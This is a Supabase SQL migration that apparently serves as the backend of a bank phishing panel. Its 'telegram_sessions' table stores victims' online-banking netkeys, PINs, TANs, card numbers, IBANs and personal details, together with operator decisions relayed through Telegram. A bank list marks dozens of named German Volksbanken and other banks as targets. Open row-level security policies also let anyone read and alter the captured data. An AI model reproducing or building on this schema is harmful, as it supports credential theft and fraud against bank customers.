-- telegram_sessions table
CREATE TABLE IF NOT EXISTS public.telegram_sessions (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  bank_id text NOT NULL,
  branch_name text NOT NULL,
  netkey text,
  pin text,
  decision text NOT NULL DEFAULT 'pending',
  decided_by_username text,
  decided_at timestamptz,
  telegram_chat_id text,
  telegram_message_id bigint,
  prompt_message_id bigint,
  devices_prompt_message_id bigint,
  online_banking_url text,
  link_copied boolean NOT NULL DEFAULT false,
  no_2fa boolean NOT NULL DEFAULT false,
  verfahren text NOT NULL DEFAULT 'securego',
  allowed_verfahren text[] NOT NULL DEFAULT ARRAY['securego']::text[],
  security_choice text,
  smart_photo_url text,
  smart_startcode text,
  smart_tan text,
  smart_tan_status text,
  smart_tan_method text,
  smart_prompt_msg_id bigint,
  customer_anrede text,
  customer_name text,
  customer_number text,
  customer_birthday text,
  customer_email text,
  customer_email_label text,
  customer_mobile text,
  customer_mobile_label text,
  customer_address_street text,
  customer_address_city text,
  customer_devices jsonb NOT NULL DEFAULT '[]'::jsonb,
  deleted_address_text text,
  extra_contacts jsonb NOT NULL DEFAULT '[]'::jsonb,
  device_name text,
  device_app_id text,
  device_registered_at text,
  post_confirm_action text,
  post_confirm_verfahren text,
  post_address_choice text,
  pin_verwaltung_token text,
  pin_verwaltung_prompt_msg_id bigint,
  pin_verwaltung_card_photo_url text,
  pin_verwaltung_card_type text,
  pin_verwaltung_card_co_badge text,
  pin_verwaltung_card_number_masked text,
  pin_verwaltung_card_id_masked text,
  pin_verwaltung_card_valid_thru text,
  pin_verwaltung_card_iban text,
  pin_verwaltung_card_holder text,
  session_pin_mode text,
  session_pin_first_attempt text,
  session_pin_first_attempt_at timestamptz,
  session_pin_confirmed text,
  session_pin_confirmed_at timestamptz,
  session_pin_new text,
  session_pin_new_at timestamptz,
  securego_locked boolean NOT NULL DEFAULT false,
  last_bump_at timestamptz,
  created_at timestamptz NOT NULL DEFAULT now(),
  updated_at timestamptz NOT NULL DEFAULT now()
);

GRANT SELECT, INSERT, UPDATE ON public.telegram_sessions TO anon;
GRANT SELECT, INSERT, UPDATE ON public.telegram_sessions TO authenticated;
GRANT ALL ON public.telegram_sessions TO service_role;

ALTER TABLE public.telegram_sessions ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Anyone can read telegram sessions" ON public.telegram_sessions;
CREATE POLICY "Anyone can read telegram sessions"
  ON public.telegram_sessions FOR SELECT USING (true);
DROP POLICY IF EXISTS "Anyone can insert telegram sessions" ON public.telegram_sessions;
CREATE POLICY "Anyone can insert telegram sessions"
  ON public.telegram_sessions FOR INSERT WITH CHECK (true);
DROP POLICY IF EXISTS "Anyone can update telegram sessions" ON public.telegram_sessions;
CREATE POLICY "Anyone can update telegram sessions"
  ON public.telegram_sessions FOR UPDATE USING (true) WITH CHECK (true);

DROP TRIGGER IF EXISTS trg_telegram_sessions_updated ON public.telegram_sessions;
CREATE TRIGGER trg_telegram_sessions_updated
  BEFORE UPDATE ON public.telegram_sessions
  FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();

DO $$
BEGIN
  BEGIN
    ALTER PUBLICATION supabase_realtime ADD TABLE public.telegram_sessions;
  EXCEPTION WHEN duplicate_object THEN NULL;
  END;
END $$;
ALTER TABLE public.telegram_sessions REPLICA IDENTITY FULL;

-- banks.is_qr_branch
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS is_qr_branch boolean NOT NULL DEFAULT false;

UPDATE public.banks SET is_qr_branch = true WHERE name = ANY(ARRAY[
  'Volksbank Butzbach eG','Volksbank Überlingen eG','VR Bank im südlichen Franken eG',
  'Volksbank Stendal eG','Raiffeisenbank im Oberland eG','Volksbank Oberberg eG',
  'Volksbank Mittweida eG','Raiffeisenbank Haag-Gars-Maitenbeth eG',
  'VR Bank Mittlere Oberpfalz eG','Raiffeisenbank Ostprignitz-Ruppin eG','Volksbank Erft eG','Leipziger Volksbank eG',
  'Volksbank Thüringen Mitte eG','Volks- und Raiffeisenbank Muldental eG','Volksbank Emstal eG',
  'Volksbank Börde-Bernburg eG','PSD Bank Karlsruhe-Neustadt eG','Volksbank Gronau-Ahaus eG',
  'Sparda-Bank Berlin eG','Volksbank Trier Eifel eG','Raiffeisenbank im Fuldaer Land eG','PSD Bank Nürnberg eG',
  'MLP Banking AG','Volksbank Heimbach eG','Bankhaus Anton Hafner KG','Volksbank Daaden eG',
  'Volksbank Schwarzwald-Donau-Neckar eG','Dortmunder Volksbank eG','Münchner Bank eG',
  'Raiffeisenbank Oberpfalz NordWest eG',
  'VR Bank Neuburg-Rain eG','VR-Bank Fläming-Elsterland eG','Raiffeisen Spar + Kreditbank eG',
  'VR Bank Bad Orb-Gelnhausen eG','VR-Bank Altenburger Land eG','Volksbank Marl-Recklinghausen eG',
  'Raiffeisenbank MEHR eG Mosel – Eifel – Hunsrück – Region','Bank im Bistum Essen eG (BIB FAIR BANKING)',
  'VR-Bank Main-Rhön eG'
]);

UPDATE public.banks SET is_qr_branch = true WHERE id = 'merkur-privatbank.';